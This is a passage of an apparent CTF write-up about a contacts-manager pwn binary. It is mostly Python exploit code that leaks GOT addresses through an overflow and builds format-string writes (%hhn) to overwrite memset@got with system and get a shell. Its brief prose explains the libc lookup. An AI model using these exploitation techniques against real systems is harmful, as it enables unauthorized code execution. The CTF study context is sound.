</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#       name          length valid  char *description // char *phone==leak-&gt;malloc@got  </span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">63</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;BBBB&quot;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;BAR2&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">last_addr</span> <span class="o">=</span> <span class="n">x</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Phone #: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">leak4</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">leak</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">last_addr</span>
</span><span class='line'>  <span class="n">last_addr</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;127.0.0.1&#39;, 4444))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.165.223.128&#39;</span><span class="p">,</span> <span class="mi">2555</span><span class="p">))</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># create contact 1</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLEH&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># create contact 2</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLAH&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">malloc</span> <span class="o">=</span> <span class="n">leak4</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] malloc @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc</span><span class="p">)</span>
</span><span class='line'>  <span class="n">puts</span> <span class="o">=</span> <span class="n">leak4</span><span class="p">(</span><span class="mh">0x804b024</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] puts   @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This gave us two addresses, and <a href="http://libcdb.com/">libcdb.com</a> gave us no less than five options. We logged back into the server for pwn100, which had a different IP address so was probably a differnent box. We figured that the CTF organizers used the same base image for each box. The symbols of the libc on pwn100&rsquo;s box seemed to match what we found via the leak and we just got the address of system from that machine.</p>

<p>Now, we needed a way to write to the got. Turns out there was another format string vulnerability in the description field:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Menu</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span><span class="n">Create</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span><span class="n">Remove</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span><span class="n">Edit</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">4</span><span class="p">)</span><span class="n">Display</span> <span class="n">contacts</span>
</span><span class='line'><span class="mi">5</span><span class="p">)</span><span class="n">Exit</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'><span class="n">Contact</span> <span class="n">info</span><span class="p">:</span>
</span><span class='line'>  <span class="n">Name</span><span class="p">:</span> <span class="n">BAR1</span>
</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Haven</span><span class="s">&#39;t written a parser for phone numbers; You have 10 numbers</span>
</span><span class='line'>  <span class="n">Enter</span> <span class="n">Phone</span> <span class="n">No</span><span class="p">:</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">Length</span> <span class="n">of</span> <span class="n">description</span><span class="p">:</span> <span class="mi">100</span>
</span><span class='line'>  <span class="n">Enter</span> <span class="n">description</span><span class="p">:</span>
</span><span class='line'>      <span class="o">%</span><span class="n">X</span><span class="o">-%</span><span class="n">X</span><span class="o">-%</span><span class="n">X</span><span class="o">-%</span><span class="n">X</span><span class="o">-%</span><span class="n">X</span><span class="o">-%</span><span class="n">X</span>
</span><span class='line'><span class="n">Menu</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span><span class="n">Create</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span><span class="n">Remove</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span><span class="n">Edit</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">4</span><span class="p">)</span><span class="n">Display</span> <span class="n">contacts</span>
</span><span class='line'><span class="mi">5</span><span class="p">)</span><span class="n">Exit</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mi">4</span>
</span><span class='line'><span class="n">Contacts</span><span class="p">:</span>
</span><span class='line'>  <span class="n">Name</span><span class="p">:</span> <span class="n">BAR1</span>
</span><span class='line'>  <span class="n">Length</span> <span class="mi">100</span>
</span><span class='line'>  <span class="n">Phone</span> <span class="c">#: 0</span>
</span><span class='line'>  <span class="n">Description</span><span class="p">:</span> <span class="mi">9</span><span class="n">B24008</span><span class="o">-</span><span class="n">F77724E0</span><span class="o">-</span><span class="n">F7771FF4</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="n">FFDE40D8</span>
</span><span class='line'><span class="n">Menu</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span><span class="n">Create</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span><span class="n">Remove</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span><span class="n">Edit</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">4</span><span class="p">)</span><span class="n">Display</span> <span class="n">contacts</span>
</span><span class='line'><span class="mi">5</span><span class="p">)</span><span class="n">Exit</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We used the same trick as in <a href="https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/">ekoparty&rsquo;s echoes binary</a>, selecting a stack address (actually a saved stack frame pointer) which points to another stack address, which we can then use to write out an address on the stack. Finally, use that third format string argument to write anything anywhere.</p>

<p>We then use the leak to determine libc&rsquo;s base address, add the offset for system, and finally overwrite memset@got with system. Then, once we delete an element with name <code>/bin/sh</code>, we in fact call <code>system('/bin/sh')</code> and we win.</p>

<p>Without further ado:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>    <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># first, leak address to which we&#39;ll write ($30) so that we can align the writes to $30</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;ZZZZ%18$.08xBBBB&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;ZZZZ(.*)BBBB&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&gt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="n">start</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>
</span><span class='line'><span class="c"># setup $30 to x (addr to write) via $18 by first setting $6-&gt;$18</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%6$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>    
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
